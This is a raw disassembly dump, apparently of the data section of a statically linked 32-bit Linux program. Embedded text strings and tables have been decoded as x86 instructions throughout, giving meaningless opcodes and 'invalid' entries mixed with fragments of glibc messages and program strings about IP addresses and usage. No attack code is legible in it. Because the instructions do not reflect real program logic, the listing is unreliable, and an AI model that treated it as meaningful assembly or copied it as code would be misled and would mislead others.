jo 0x8092673
xor dword [ebx], edi
jge 0x80926d4
jge 0x809267c
das
je 0x80926c9
jo 0x809268d
push 0x69
add byte [edx], ch
sub ch, byte [edx]
sub ah, byte [eax]
dec ebp
popal
js 0x80926b8
outsd dx, dword [esi]
popal
and byte fs:[eax], ch
ja 0x80926dc
outsb dx, byte [esi]
outsd dx, dword fs:[esi]
ja 0x80926eb
and byte [edx + 0x70], dh
arpl word [eax], sp
js 0x80926f0
insb byte es:[edi], dx
outsd dx, dword [esi]
imul esi, dword [ecx + ebp + 0x20], 0x20312e76
sub ch, byte [edx]
sub cl, byte [edx]
add byte [eax], al
inc esi
outsd dx, dword [esi]
jb 0x80926b4
jne 0x80926fb
popal
je 0x8092704
outsd dx, dword [esi]
outsb dx, byte [esi]
popal
insb byte es:[edi], dx
and byte [eax + 0x72], dh
outsd dx, dword [esi]
jo 0x8092714
jae 0x809270c
and byte [edi + 0x6e], ch
insb byte es:[edi], dx
jns 0x80926ce
or cl, byte [edx]
add byte [ebp + 0x72], ah
jb 0x8092725
outsd dx, dword [esi]
jb 0x80926f0
and byte [ecx + 0x6f], bh
jne 0x80926db
insd dword es:[edi], dx
jne 0x8092731
je 0x80926e0
outsb dx, byte gs:[esi]
je 0x8092729
jb 0x80926e6
popal
and byte [esi + 0x61], dh
insb byte es:[edi], dx
imul esp, dword [eax + 0x69], 0x75000a70
jne 0x8092747
popal
cmp ah, byte gs:[di]
jae 0x80926fb
pop ebx
dec ecx
push eax
sub eax, 0x52444441
inc ebp
push ebx
push ebx
pop ebp
or al, byte [eax]
cmp ah, byte cs:[bx + si]
and eax, 0x39312073
xor ch, byte [esi]
xor dword [esi], esi
cmp byte [esi], ch
xor dword [esi], ebp
xor dh, byte [ebx]
or cl, byte [edx]
add byte [edi], dh
and eax, 0x6c250073
js str.error_in_ip_address:_sscanf
jb 0x809277e
outsd dx, dword [esi]
jb 0x809272f
imul ebp, dword [esi + 0x20], 0x61207069
jb 0x809277f
jae 0x809278f
cmp ah, byte [eax]
jae 0x8092793
arpl word [ecx + 0x6e], sp
add byte [eax], al
add byte [eax], al
jb 0x809279d
outsd dx, dword [esi]
jb 0x8092768
and byte [ecx + 0x6c], ah
imul esp, dword [edi + 0x6e], 0x746e656d
and byte [ebx + 0x6f], ah
jne 0x80927a9
and byte fs:[esi + 0x6f], ch
je 0x8092763
bound esp, qword [ebp + 0x20]
outsd dx, dword fs:[esi]
outsb dx, byte [esi]
add byte gs:[edx], bh
cmp ch, byte [edi]
das
pop ebx
add byte [ebx + 0x75], dl
push ebx
jne 0x80927b6
arpl word [ebp + 0x73], sp
jae 0x80927be
jne 0x80927c6
insb byte es:[edi], dx
jns 0x809277d
jae 0x80927c4
outsb dx, byte [esi]
and byte fs:[eax + 0x61], dh
jns 0x80927d2
outsd dx, dword [esi]
popal
and dword fs:[edx], ecx
push esp
jb 0x80927e7
and byte [ebx + 0x6f], ah
outsb dx, byte [esi]
outsb dx, byte [esi]
arpl word gs:[eax + 0x74], si
outsd dx, dword [esi]
and byte [0x6f702073], ah
jb 0x80927f5
and byte [ebx], dh
xor dword [ebx], esi
xor esi, dword [edi]
or cl, byte [edx]
add byte [edi], ch
das
jbe 0x80927be
outsb dx, byte [esi]
jne 0x80927fe
insb byte es:[edi], dx
add byte [ebx + 0x61], ah
arpl word [ecx + 0x6e], sp
outsb dx, byte [esi]
outsd dx, dword [esi]
je 0x80927bb
jae str._dev_log
je 0x80927bf
jne 0x8092811
and byte [esp + eax*2 + 0x54], cl
and byte [esi + 0x6f], ah
jb 0x80927ca
je 0x8092814
jb 0x8092813
popal
sub eax, 0x61636f6c
insb byte es:[edi], dx
and byte [ebx + 0x74], dh
outsd dx, dword [esi]
jb 0x809281d
or al, byte gs:[bx + si]
imul esp, dword [ebp + 0x72], 0x6e
insb byte es:[edi], dx
and byte [edi + ebp*2 + 0x6f], dh
and byte [edi + 0x6c], ch
and byte fs:[esi + 0x6f], ah
jb 0x80927f3
je 0x809283d
jb 0x809283c
popal
sub eax, 0x61636f6c
insb byte es:[edi], dx
and byte [ebx + 0x74], dh
outsd dx, dword [esi]
jb 0x8092846
and byte gs:[bp + di + 0x75], dh
jo 0x809285c
outsd dx, dword [esi]
jb 0x8092863
or al, byte [eax]
das
jbe 0x8092825
jne 0x809286a
popal
outsb dx, byte [esi]
outsd dx, dword fs:[esi]
insd dword es:[edi], dx
add byte [eax], ch
sub dword [edx], ecx
add byte [edi], ch
das
jbe 0x8092836
insb byte es:[edi], dx
outsd dx, dword [esi]
add byte [bx + si], al
cmp ah, byte [eax]
jae 0x8092884
popal
arpl word [ebx + 0x20], bp
jae 0x8092883
popal
jae 0x8092881
imul ebp, dword [esi + 0x67], 0x74746120
popal
arpl word [ebx + 0x20], bp
imul ebp, dword [esi + 0x20], 0x636e7566
je 0x8092896
outsd dx, dword [esi]
outsb dx, byte [esi]
and byte [eax], al
add byte [eax], al
add byte [ebx - 0x6d], dl
add al, 8
push ebx
xchg ebx, eax
add al, 8
inc eax
xchg ebx, eax
add al, 8
sahf
xchg ebx, eax
add al, 8
mov dword [525459], eax
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add bh, bh
invalid
invalid
jg 0x80928ba
push ebp
push ebp
push ebp
push ebp
invalid
invalid
invalid
aas
xor esi, dword [ebx]
xor esi, dword [ebx]
stosb byte es:[edi], al
stosb byte es:[edi], al
stosb byte es:[edi], al
sub ah, byte [ecx + ecx*2]
xchg edx, eax
and al, 0xff
invalid
call [edi]
sbb al, 0xc7
jno 0x809289c
cdq
cdq
cdq
sbb dword [ecx + edx*8 + 0x45], esi
pop ss
push ebp
push ebp
push ebp
adc eax, 0x13b13b13
xchg edx, eax
and al, 0x49
adc dl, byte [ecx]
adc dword [ecx], edx
adc edi, edi
invalid
dec dword [edi]
invalid
pfpnacc mm1, qword [edi]
jecxz 0x80928db
push cs
pop esi
inc ebx
jns 0x80928b5
int3
int3
int3
or al, 0xc
ret
xor byte [edx + edi*4], cl
call 0x6c353458
or ebp, dword [esp]
and dword [ebx], ecx
stosb byte es:[edi], al
stosb byte es:[edi], al
stosb byte es:[edi], al
or ah, byte [ebx - 0x76f5c290]
popfd
fmul dword [ecx]
or dword [esi + 0x42], ebx
jnp 0x80928d1
dec ecx
xchg edx, eax
and al, 9
mov al, 0xdc
ror dword [eax], cl
mov byte [eax + 0x10840888], cl
inc edx
or bh, bh
invalid
inc dword [edi]
jl 0x80928ce
rol dword [edi], 0x87
xchg dword [edi + 0x50750707], eax
pop es
pop es
jne 0x8092937
pop es
invalid
jno 0x8092907
pop es
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add dword [eax], eax
add eax, dword [eax]
add eax, dword [ebx]
pop es
add eax, dword [0x3080303]
add byte [edi], cl
add byte [ebx], al
add eax, 0xb03030f
unpcklps xmm2, xmmword [0xf0f0315]
add ebx, dword [edi]
add edx, dword [ecx]
or al, byte [ebx]
cmp ah, byte [eax]
add byte [edi + 0x2b], dh
add byte [eax], al
add byte [eax], al
and eax, 0x73000000
add byte [eax], al
add byte [0x73000000], ah
add byte [eax], al
add byte [0x73000000], ah
add byte [eax], al
add byte [edx], cl
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [edi + 0x49], bl
pop edi
dec ecx
dec edi
pop edi
ja 0x80929b8
imul ebp, dword [ebp + 0x5f], 0x65646e75
jb 0x80929c2
insb byte es:[edi], dx
outsd dx, dword [esi]
ja str.wfileops.c
ja 0x80929c8
imul ebp, dword [ebp + 0x6f], 0x632e7370
add byte [ebx + 0x74], dh
jae 0x80929e1
popal
je 0x80929e5
jae 0x8092992
cmp eax, 0x5f5f203d
arpl word [edi + 0x64], bp
arpl word gs:[esi + 0x74], si
pop edi
jo 0x80929e2
jb 0x80929f7
imul esp, dword [ecx + 0x6c], 0
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov al, byte [0x600804b7]
test eax, 0xa4600804
add al, 8
rcr byte [edi + eax + 8], 1
loopne 0x8092a14
pop es
or byte [eax - 0x4e], dl
add al, 8
add dl, dl
add al, 8
nop
lodsb al, byte [esi]
add al, 8
jo 0x80929a8
add al, 8
loopne 0x809298a
add al, 8
push eax
stosd dword es:[edi], eax
add al, 8
inc eax
push edx
pop es
or byte [eax - 0xff7fb32], ah
iretd
add al, 8
add bh, cl
add al, 8
mov al, 0xcf
add al, 8
and bh, cl
add al, 8
push eax
call 0xf06931f6
add al, 8
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov al, byte [0x600804b7]
test eax, 0xa8000804
add al, 8
rcr byte [edi + eax + 8], 1
loopne 0x8092a74
pop es
or byte [eax - 0x4e], dl
add al, 8
add dl, dl
add al, 8
nop
lodsb al, byte [esi]
add al, 8
jo 0x8092a08
add al, 8
xor byte [ebp - 0x54aff7fc], bh
add al, 8
inc eax
push edx
pop es
or byte [eax - 0xff7fb32], ah
iretd
add al, 8
add bh, cl
add al, 8
push eax
iretd
add al, 8
and bh, cl
add al, 8
push eax
call 0xf0693256
add al, 8
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov al, byte [0x600804b7]
test eax, 0xa9200804
add al, 8
rcr byte [edi + eax + 8], 1
loopne 0x8092ad4
pop edx
pop es
or byte [eax - 0x4e], dl
add al, 8
add dl, dl
add al, 8
nop
lodsb al, byte [esi]
add al, 8
jo 0x8092a68
add al, 8
xor byte [ebp - 0x54aff7fc], bh
add al, 8
or byte [eax + 0x52], al
pop es
or byte [eax - 0xff7fb32], ah
iretd
add al, 8
add bh, cl
add al, 8
mov al, 0xcf
add al, 8
and bh, cl
add al, 8
push eax
call 0xf06932b6
add al, 8
or byte [ebx], ch
arpl word [ebx + 0x3d], si
add byte [edi + 0x49], bl
pop edi
dec ecx
dec edi
pop edi
outsb dx, byte [esi]
ja 0x8092b21
imul bp, word [ebp + 0x5f], 0x6f66
jo 0x8092b30
outsb dx, byte [esi]
add byte [esi + 0x63], ah
arpl word [ebx + esi*2 + 0x2e], si
je 0x8092b43
insd dword es:[edi], dx
bound ebx, qword [edi + 0x6e]
jae 0x8092b4e
jo 0x8092b50
and byte [0x31203d], bh
arpl word [ebx + esi*2 + 0x2e], si
je 0x8092b59
ja 0x8092b4f
pop edi
outsb dx, byte [esi]
jae 0x8092b64
jo 0x8092b66
and byte [0x31203d], bh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax - 0x3ff7fb49], ah
lds eax, [eax + ecx]
mov al, 0xbe
add al, 8
and ah, bl
add al, 8
loopne 0x8092b00
add al, 8
nop
rol byte [eax + ecx], 1
add dl, dl
add al, 8
invalid
enter 0x804, 0x70
fiadd word [eax + ecx]
loopne 0x8092aea
add al, 8
add bh, 4
or byte [eax - 0x5ff7f8b1], al
into
add al, 8
invalid
iretd
add al, 8
add bh, cl
add al, 8
mov al, 0xcf
add al, 8
and bh, cl
add al, 8
push eax
call 0xf0693356
add al, 8
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov al, byte [0xc00804b7]
lds eax, [eax + ecx]
add bl, 4
or byte [eax], ah
fadd qword [eax + ecx]
loopne 0x8092b60
add al, 8
nop
rol byte [eax + ecx], 1
adc bl, 4
or byte [eax], ah
int 4
or byte [eax - 0x22], dh
add al, 8
xor byte [ebp - 0x37aff7fc], bh
add al, 8
or byte [edi + 7], 8
mov al, byte [0xf00804ce]
iretd
add al, 8
add bh, cl
add al, 8
push eax
iretd
add al, 8
and bh, cl
add al, 8
push eax
call 0xf06933b6
add al, 8
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
mov al, byte [0xc00804b7]
lds eax, [eax + ecx]
nop
lds eax, [eax + ecx]
and ah, bl
add al, 8
loopne 0x8092bc0
add al, 8
nop
rol byte [eax + ecx], 1
jo 0x8092bb6
add al, 8
inc eax
into
add al, 8
jo 0x8092bc8
add al, 8
xor byte [ebp - 0x387ff7fc], bh
add al, 8
or byte [edi + 7], 8
mov al, byte [0xf00804ce]
iretd
add al, 8
add bh, cl
add al, 8
mov al, 0xcf
add al, 8
and bh, cl
add al, 8
push eax
call 0xf0693416
add al, 8
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
pushal
in eax, dx
add al, 8
inc eax
ljmp 0x804:0xeb900804
and ah, bl
add al, 8
xor ch, ch
add al, 8
pushal
fadd qword [eax + ecx]
xor ch, bl
add al, 8
adc ah, ch
add al, 8
jo 0x8092c28
add al, 8
rcr ch, 4
or al, dl
loopne 0x8092c57
or byte [eax + 0x300804de], dh
call 0xf0493462
add al, 8
adc al, ch
add al, 8
shl al, 1
add al, 8
and al, ch
add al, 8
push eax
call 0xf0693476
add al, 8
or byte [edx + edx*2 + 0x49], dl
dec ebp
pop edi
push esp
dec eax
push edx
inc ebp
push ebx
dec eax
dec edi
dec esp
inc esp
pop edi
add byte [ebp + 0x4d], cl
dec ebp
dec ebp
inc ecx
push eax
pop edi
push esp
dec eax
push edx
inc ebp
push ebx
dec eax
dec edi
dec esp
inc esp
pop edi
add byte [ebp + 0x4d], cl
dec ebp
dec ebp
inc ecx
push eax
pop edi
dec ebp
inc ecx
pop eax
pop edi
add byte [edi + ecx*2 + 0x50], dl
push esp
dec edi
push eax
pop edi
push eax
inc ecx
inc esp
pop edi
add byte [ebp + 0x61], ch
insd dword es:[edi], dx
popal
insb byte es:[edi], dx
insb byte es:[edi], dx
outsd dx, dword [esi]
arpl word [edx], di
and byte [edi + ebp*2 + 0x70], dh
and byte [ebx + 0x68], ah
jne 0x8092d25
imul esp, dword [eax], 0x69
jae 0x8092cdc
arpl word [edi + 0x72], bp
jb 0x8092d36
jo 0x8092d37
or al, byte [eax]
jb 0x8092d2d
sub byte gs:[ecx], ch
cmp ah, byte [eax]
imul ebp, dword [esi + 0x76], 0x64696c61
and byte [eax + 0x6f], dh
imul ebp, dword [esi + 0x74], 0x25207265
jo 0x8092d01
or al, byte [eax]
inc ecx
jb 0x8092d4a
outsb dx, byte [esi]
popal
and byte [0xa3a64], ah
jae str.malloc:_using_debugging_hooks_n
jae 0x8092d65
insd dword es:[edi], dx
and byte [edx + 0x79], ah
je 0x8092d5d
jae 0x8092d1a
and byte [eax], ah
and byte [eax], ah
cmp eax, 0x30312520
jne 0x8092d0f
add byte [ecx + 0x6e], ch
imul ebp, dword [esi + 0x20], 0x20657375
bound edi, qword [ecx + 0x74]
jae 0x8092d33
and byte [eax], ah
and byte [eax], ah
cmp eax, 0x30312520
jne 0x8092d28
add byte [edi + ebp*2 + 0x74], dl
push esp
outsd dx, dword [esi]
je 0x8092d84
insb byte es:[edi], dx
and byte [eax], ch
imul ebp, dword [esi + 0x63], 0x6d202e6c
insd dword es:[edi], dx
popal
jo 0x8092d5a
cmp cl, byte [edx]
add byte [ebp + 0x61], ch
insd dword es:[edi], dx
popal
js 0x8092d58
insd dword es:[edi], dx
insd dword es:[edi], dx
popal
jo 0x8092d5d
jb 0x8092da4
imul ebp, dword [bx + 0x6e], 0x203d2073
and eax, 0xa753031
add byte [ebp + 0x61], ch
insd dword es:[edi], dx
popal
js 0x8092d71
insd dword es:[edi], dx
insd dword es:[edi], dx
popal
jo 0x8092d76
bound edi, qword [ecx + 0x74]
jae 0x8092d7c
and byte [eax], ah
cmp eax, 0x30312520
insb byte es:[edi], dx
jne 0x8092d70
add byte [eax], al
insd dword es:[edi], dx
popal
insb byte es:[edi], dx
insb byte es:[edi], dx
outsd dx, dword [esi]
arpl word [edx], di
and byte [ebp + 0x73], dh
imul ebp, dword [esi + 0x67], 0x62656420
jne 0x8092de2
imul ebp, dword [bp + 0x67], 0x6f6f6820
imul esi, dword [ebx + 0xa], 0
add byte [edx + 0x65], dh
jb 0x8092def
popal
insb byte es:[edi], dx
insb byte es:[edi], dx
outsd dx, dword [esi]
arpl word [eax], bp
sub dword [edx], edi
and byte [ecx + 0x6e], ch
jbe 0x8092df8
insb byte es:[edi], dx
imul esp, dword [eax + 0x70], 0x746e696f
jb str._bUnknown_error_
and eax, 0xa2170
fidiv word [ecx]
add eax, 0x531e608
or dh, ch
xor dword [0x531fe08], eax
or byte [esi], al
xor al, byte [0x531a108]
or byte [eax + 0x31], bh
add eax, 0x6b6e5508
or byte [ebp + 0x6e], dl
imul ebp, dword [esi + 0x6f], 0x77
outsb dx, byte [esi]
and byte [ebp + 0x72], ah
jb 0x8092e3f
jb 0x8092df2
add byte [ecx + 0x4e], al
inc ecx
dec esi
push ebx
dec ecx
pop edi
pop eax
xor ebp, dword [esi]
xor al, 0x2d
xor dword [ecx], edi
cmp byte ss:[edi], ch
das
push esp
push edx
inc ecx
dec esi
push ebx
dec esp
dec ecx
push esp
add byte [eax], ah
xchg ebp, eax
or cl, byte [eax]
add dword [eax], eax
add byte [eax], al
pushal
xchg ebp, eax
or cl, byte [eax]
add dword [eax], eax
add byte [eax], al
arpl word [ecx + 0x6e], sp
outsb dx, byte [esi]
outsd dx, dword [esi]
je 0x8092e23
js 0x8092e7a
outsb dx, byte gs:[esi]
and byte fs:[edi + 0x6c], ah
outsd dx, dword [esi]
bound esp, qword [ecx + 0x6c]
and byte [ebx + 0x63], dh
outsd dx, dword [esi]
jo 0x8092e7b
add byte [esp + ebp*2 + 0x6f], ah
insb byte es:[edi], dx
outsd dx, dword [esi]
jo 0x8092e81
outsb dx, byte [esi]
add byte [esp + ebp*2 + 0x5f], ah
insb byte es:[edi], dx
pop edi
outsd dx, dword [esi]
jo 0x8092e89
outsb dx, byte [esi]
pop edi
ja 0x8092e97
jb 0x8092e95
jb str.dl_open.c
insb byte es:[edi], dx
sub eax, 0x6e65706f
arpl word cs:[eax], ax
imul esp, dword [eax + edi*2 + 0x20], 0x30203d3d
add byte [ebx + 0x61], ah
arpl word [ecx + 0x6e], sp
outsb dx, byte [esi]
outsd dx, dword [esi]
je 0x8092e67
arpl word [edx + 0x65], si
popal
je 0x8092eb2
and byte [ebx + 0x63], dh
outsd dx, dword [esi]
jo 0x8092eb8
and byte [ecx + ebp*2 + 0x73], ch
je str.mode__0x00004
insd dword es:[edi], dx
outsd dx, dword [esi]
and byte gs:[esi], ah
and byte [eax], dh
js 0x8092e93
xor byte [eax], dh
xor byte [eax + eax], dh
sub byte [ebx + 0x61], ah
insb byte es:[edi], dx
insb byte es:[edi], dx
pop edi
insd dword es:[edi], dx
popal
jo 0x8092e9b
sub eax, 0x6e5f6c3e
popal
insd dword es:[edi], dx
pop ebx
xor byte [ebp + 0x20], bl
cmp eax, 0x5c27203d
xor byte [edi], ah
add byte [ecx + 0x6e], ch
imul ebp, dword [esi + 0x76], 0x64696c61
and byte [ebp + 0x6f], ch
and byte gs:[esi + 0x6f], ah
jb 0x8092eb7
insb byte es:[edi], dx
outsd dx, dword [esi]
jo 0x8092f01
outsb dx, byte [esi]
sub byte [ecx], ch
add byte [edi + 0x70], ch
outsd dx, dword [esi]
jo 0x8092f08
outsb dx, byte [esi]
imul ebp, dword [esi + 0x67], 0x6c696620
cmp eax, 0x203b7325
outsd dx, dword [esi]
jo 0x8092f19
outsb dx, byte [esi]
arpl word [edi + 0x75], bp
outsb dx, byte [esi]
je 0x8092edb
cmp eax, 0x7525203d
or cl, byte [edx]
add byte [eax], al
arpl word [ecx + 0x6e], sp
outsb dx, byte [esi]
outsd dx, dword [esi]
je 0x8092eeb
arpl word [edx + 0x65], si
popal
je 0x8092f36
and byte [esp + ecx*2 + 0x53], dl
and byte [ecx + 0x74], ah
popal
and byte [ebx + 0x74], dh
jb 0x8092f54
arpl word [ebp + esi*2 + 0x72], si
jae 0x8092ee6
add byte [eax], al
outsb dx, byte [esi]
ja 0x8092f19
insb byte es:[edi], dx
pop edi
jae 0x8092f56
popal
jb 0x8092f57
push 0x7473696c
jb 0x8092f5b
insb byte es:[edi], dx
imul esi, dword [ebx + 0x74], 0x2d5d695b
insb byte es:[edi], dx
pop edi
je 0x8092f82
jo 0x8092f70
and byte [0x746c203d], bh
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
popal
add byte fs:[eax], al
add byte [eax], al
insd dword es:[edi], dx
jo 0x8092f94
jns 0x8092f42
jns 0x8092f93
popal
insd dword es:[edi], dx
imul esp, dword [ebx + 0x20], 0x69727473
outsb dx, byte [esi]
and byte [si + 0x6f], dh
imul esp, dword [ebp + 0x6e], 0x20
jae 0x8092fae
bound esi, qword [ebx + 0x74]
imul esi, dword [ebp + esi*2 + 0x74], 0x6e6f69
inc esp
push ebx
push esp
and byte [esi + 0x6f], ch
je str.TLS_generation_counter_wrapped___Please_send_report_with_the_glibcbug_script.
popal
insb byte es:[edi], dx
insb byte es:[edi], dx
outsd dx, dword [esi]
ja 0x8092fb7
and byte fs:[ecx + 0x6e], ch
and byte [ebx + 0x55], dl
dec ecx
inc esp
das
push ebx
inc edi
dec ecx
inc esp
and byte [eax + 0x72], dh
outsd dx, dword [esi]
jb 0x8092fc8
insd dword es:[edi], dx
jae 0x8092f6a
add byte [eax], al
push esp
dec esp
push ebx
and byte [edi + 0x65], ah
outsb dx, byte [esi]
jb str.__should_be_there
je 0x8092fe1
outsd dx, dword [esi]
outsb dx, byte [esi]
and byte [ebx + 0x6f], ah
jne 0x8092fed
je 0x8092fe6
jb 0x8092fa3
ja 0x8092ff7
popal
jo 0x8092ff8
and dword fs:[eax], esp
and byte [eax + 0x6c], dl
popal
jae 0x8092ff8
and byte [ebx + 0x65], dh
outsb dx, byte [esi]
and byte fs:[edx + 0x65], dh
jo 0x809300c
jb 0x8093013
and byte [edi + 0x69], dh
je 0x809300c
and byte [eax + ebp*2 + 0x65], dh
and byte [edi], ah
insb byte es:[di], dx
imul esp, dword [edx + 0x63], 0x27677562
and byte [ebx + 0x63], dh
jb 0x8093021
jo 0x809302e
add byte cs:[edx + 0x65], dh
jb 0x8093023
insd dword es:[edi], dx
outsd dx, dword [esi]
jbe 0x8093027
pop edi
jae 0x8093031
outsd dx, dword [esi]
je 0x8093031
outsb dx, byte [esi]
outsw dx, word [esi]
add byte [esp + ebp*2 + 0x2d], ah
insb byte es:[edi], dx
sub eax, 0x736f6c63
arpl word cs:[eax], ax
and dword [eax], esp
jae 0x8093043
outsd dx, dword [esi]
jne 0x809304a
pop edi
bound esp, qword [ebp + 0x5f]
je 0x809304d
jb 0x809304d
add byte [edi + 0x6c], ch
outsd dx, dword [esi]
insb byte es:[edi], dx
pop edi
insd dword es:[edi], dx
popal
jo 0x809301e
insb byte es:[edi], dx
pop edi
je 0x8093062
jae 0x8093057
insd dword es:[edi], dx
outsd dx, dword [esi]
imul esp, dword fs:[eax + 0x3d], 0x6469203d
js str.mark_removed
insd dword es:[edi], dx
popal
jb 0x8093074
pop edi
jb 0x8093071
insd dword es:[edi], dx
outsd dx, dword [esi]
jbe 0x8093075
add byte fs:[edi + 0x64], bl
pop edi
insb byte es:[edi], dx
pop edi
arpl word [edi + ebp*2 + 0x73], bp
add byte gs:[edx], cl
or ah, byte [ebx + 0x61]
insb byte es:[edi], dx
insb byte es:[edi], dx
imul ebp, dword [esi + 0x67], 0x6e696620
imul edi, dword [edx], 0xa732520
or al, byte [eax]
outsb dx, byte [esi]
ja 0x8093093
outsd dx, dword [esi]
jo 0x809309c
outsb dx, byte [esi]
arpl word [edi + 0x75], bp
outsb dx, byte [esi]
je 0x8093099
xor byte [ebp + 0x20], bl
cmp eax, 0x30203d
jae str.dep_list_j___l_idx___map__l_searchlist.r_nlist
popal
jb str.dep_list_j___l_idx___map__l_searchlist.r_nlist
and byte fs:[edi + 0x62], ch
push 0x65
arpl word [eax + 0x6e], si
outsd dx, dword [esi]
je 0x8093078
outsd dx, dword [esi]
jo 0x80930c0
outsb dx, byte [esi]
add byte [eax], al
add byte [eax], al
jb 0x80930c7
insd dword es:[edi], dx
insd dword es:[edi], dx
popal
jo 0x8093094
insb byte es:[edi], dx
pop edi
jb 0x80930d1
insb byte es:[edi], dx
jo 0x80930e4
pop ebx
push 0x5d
sub eax, 0x745f6c3e
jns 0x80930eb
and byte gs:[0x746c203d], bh
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
popal
add byte fs:[eax], al
add byte [ebp + 0x70], ah
jo 0x80930ef
insb byte es:[edi], dx
imul esi, dword [ebx + 0x74], 0x2d5d6a5b
insb byte es:[edi], dx
pop edi
je 0x8093116
jo str.imap__l_type__lt_loaded__imap__l_opencount___0
and byte [0x746c203d], bh
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
popal
add byte fs:[eax], al
add byte [eax], al
jo 0x8093113
insb byte es:[edi], dx
imul esi, dword [ebx + 0x74], 0x2d5d6a5b
insb byte es:[edi], dx
pop edi
imul esp, dword [eax + edi*2 + 0x20], 0x616d203c
jo 0x80930f6
insb byte es:[edi], dx
pop edi
jae 0x8093133
popal
jb 0x8093134
push 0x7473696c
jb 0x8093138
outsb dx, byte [esi]
insb byte es:[edi], dx
imul esi, dword [ebx + 0x74], 0x630a0000
or ah, byte [ebx + 0x6c]
outsd dx, dword [esi]
jae 0x809314f
outsb dx, byte [esi]
and byte [bp + 0x69], ah
insb byte es:[edi], dx
cmp eax, 0x203b7325
outsd dx, dword [esi]
jo 0x809315a
outsb dx, byte [esi]
arpl word [edi + 0x75], bp
outsb dx, byte [esi]
je 0x809311c
cmp eax, 0x7525203d
or al, byte [eax]
add byte [ecx + 0x6d], ch
imul ebp, dword [ebp + 0x61], 0x6c3e2d70
pop edi
je 0x8093187
jo 0x8093175
and byte [0x746c203d], bh
pop edi
insb byte es:[edi], dx
outsd dx, dword [esi]
popal
and byte fs:[esp + edi*2 + 0x20], bh
imul ebp, dword [ebp + 0x61], 0x6c3e2d70
pop edi
outsd dx, dword [esi]
jo 0x8093191
outsb dx, byte [esi]
arpl word [edi + 0x75], bp
outsb dx, byte [esi]
je 0x8093153
and byte ds:[eax], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [eax], al
jo str.cmov
add byte [eax], al
add byte [eax], al
add byte [esi + 0x6d], dh
add byte gs:[eax], al
add byte [eax], al
add byte [ebp], ah
add byte [eax], al
add byte [eax], al
add byte [eax + 0x73], dh
add byte gs:[eax], al
add byte [eax], al
add byte [ebx + esi*2 + 0x63], dh
add byte [eax], al
add byte [eax], al
add byte [ebp + 0x73], ch
jb 0x809316c
add byte [eax], al
add byte [eax], al
jo 0x80931d3
add byte gs:[eax], al
add byte [eax], al
add byte [ebp + 0x63], ch
add byte gs:[eax], al
add byte [eax], al
add byte [ebx + 0x78], ah
cmp byte [eax], al
add byte [eax], al
add byte [eax], al
popal
jo 0x80931f4
arpl word [eax], ax
add byte [eax], al
add byte [ecx], dh
xor byte [eax], al
add byte [eax], al
add byte [eax], al
add byte [ebx + 0x65], dh
jo 0x809319c
add byte [eax], al
add byte [eax], al
insd dword es:[edi], dx
je 0x8093215
jb 0x80931a5
add byte [eax], al
add byte [eax + 0x67], dh
add byte gs:[eax], al
add byte [eax], al
add byte [ebp + 0x63], ch
popal
add byte [eax], al
add byte [eax], al
add byte [ebx + 0x6d], ah
arpl word [ebp + 0x6f], bp
jbe 0x80931bd
add byte [eax], al
add byte [eax + 0x61], dh
je 0x80931c4
add byte [eax], al
add byte [eax], al
jo 0x809323d
xor esi, dword gs:[esi]
add byte [eax], al
add byte [eax + 0x6e], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
arpl word [esi + 0x6c], bp
jne 0x8093251
push 0x303200
add byte [eax], al
add byte [eax], al
add byte [esp + esi*2 + 0x73], ah
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x63], ah
popal
arpl word [eax + 0x69], si
add byte [eax], al
add byte [eax], al
insd dword es:[edi], dx
insd dword es:[edi], dx
js 0x80931fc
add byte [eax], al
add byte [eax], al
js 0x8093276
jb 0x8093205
add byte [eax], al
add byte [ebx + 0x73], dh
add byte gs:[eax], al
add byte [eax], al
add byte [ebx + 0x73], dh
jae 0x8093285
xor al, byte gs:[eax]
add byte [eax], al
add byte [ebx + 0x73], dh
add byte [eax], al
add byte [eax], al
add byte [eax], al
push 0x74
add byte [eax], al
add byte [ebp + ebp*2], dh
add byte [eax], al
add byte [eax], al
add byte [ecx + 0x61], ch
imul esp, dword [ecx + 0x36], 0x34
add byte [eax + 0x62], dh
add byte gs:[eax], al
add byte [eax], al
add byte [ecx + 0x33], ch
imul esi, dword [ebx], 0x69003638
imul esi, dword [eax + edi], 0x35690036
imul esi, dword [0x69003638], 0x363836
imul esi, dword [esi], 0x62003638
pushal
add eax, 0x5603008
or byte [eax + 5], ch
or byte [edx], ah
pushal
add eax, 0x5603008
or byte [eax], dh
pushal
add eax, 0x5603008
or byte [eax], dh
pushal
add eax, 0x5607608
